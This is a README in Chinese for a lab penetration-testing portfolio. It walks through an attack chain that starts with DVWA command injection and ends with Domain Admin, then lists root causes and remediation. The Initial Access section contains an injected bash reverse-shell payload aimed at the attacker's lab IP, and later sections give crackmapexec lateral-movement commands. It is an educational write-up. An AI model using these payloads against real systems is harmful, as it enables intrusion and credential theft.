# Web 到 Domain Admin 攻擊鏈實驗

本專案模擬從Web漏洞入侵到完整網域控制的真實攻擊情境。

> 作品集展示版本：建議先閱讀 [作品集摘要](PORTFOLIO.zh-TW.md)。

# Summary

本專案展示如何從一個 Web 漏洞，最終取得 Active Directory 完整控制權。

攻擊從 Command Injection 開始，經由憑證取得、橫向移動與內網 Pivot，最終取得 Domain Admin 權限。

此攻擊鏈反映真實世界中常見的情境，攻擊者透過多個弱點串聯，最終造成重大安全事件。

本專案於隔離實驗環境中執行，僅用於學習與作品集展示。

# Scope

- 攻擊端：Kali Linux
- Web Server：Ubuntu（DVWA）
- 工作站（Pivot）：Windows 10（雙網卡）
- 網域控制器：Windows Server 2022

# Network Architecture

```text
Kali (192.168.203.131)
→ 外網
Ubuntu/DVWA (192.168.203.130)
→ Windows 工作站
(外網: 192.168.203.132, 內網: 192.168.88.110)
→ 內網
Domain Controller (192.168.88.100)
```

# Attack Path

```text
外部 -> Web漏洞 -> 憑證取得 -> 橫向移動 -> 網域控制
```

<p align="center">
  <img src="evidence/core/attack-path.png" alt="Attack Diagram">
</p>

此流程代表從初始入侵到完整網域控制的典型攻擊模型。

# 詳細報告

- [English Report](report/Report.en.md)
- [中文報告](report/Report.zh-TW.md)

# Initial Access

## 漏洞

Command Injection

## 方法

- 注入 `;` 執行指令
- 建立 Reverse Shell

## Payload

```bash
127.0.0.1; whoami
127.0.0.1; bash -i >& /dev/tcp/192.168.203.131/4444 0>&1
```

## 成因

- 未驗證輸入
- 直接執行使用者輸入

# Credential Access

## 來源

`.env`

## 觀察

- 帳密外洩
- 帳號重用

## 風險

憑證重用可使攻擊者進入內網系統。

# Lateral Movement

## 技術

SMB 驗證

## 指令

```bash
crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab
```

## 結果

```text
lab\svc-sql:<REDACTED> (Pwn3d!)
```

# Internal Pivot

## 概念

雙網卡主機作為內外網橋接

## 指令

```bash
crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab --exec-method smbexec -x whoami
```

## 結果

```text
nt authority\system
```

此配置繞過網路分段，使攻擊者可在不同網路區段間移動，避開傳統邊界防護機制。

# Domain Enumeration

## 工具

- ipconfig
- arp
- nslookup

## 服務

- Kerberos
- LDAP
- SMB

# Credential Dumping

## 技術

LSASS 記憶體擷取

LSASS 儲存 NTLM hash 與 Kerberos ticket。

# Privilege Escalation

## 方法

hashcat 離線破解

## 結果

- 取得 Domain Admin 帳密
- 完整控制網域

# Impact

此攻擊展示低風險漏洞如何串聯成重大資安事件。

此案例強調縱深防禦（Defense-in-depth）的重要性，單一弱點即可導致整體系統淪陷。

- 完整網域控制
- 資料存取
- 持久化控制
- 橫向移動能力

# Root Cause

- 憑證重用
- 雙網卡主機
- 網路分段不足
- 敏感資訊外洩
- 權限過高

# Remediation

- 強化網路分段
- 移除雙網卡架構
- 避免帳密重用
- 導入多重驗證（MFA）
- 保護設定檔
- 落實最小權限原則
- 部署 SIEM / EDR 偵測橫向移動

完整測試過程與原始截圖請參考 `evidence/raw` 資料夾。
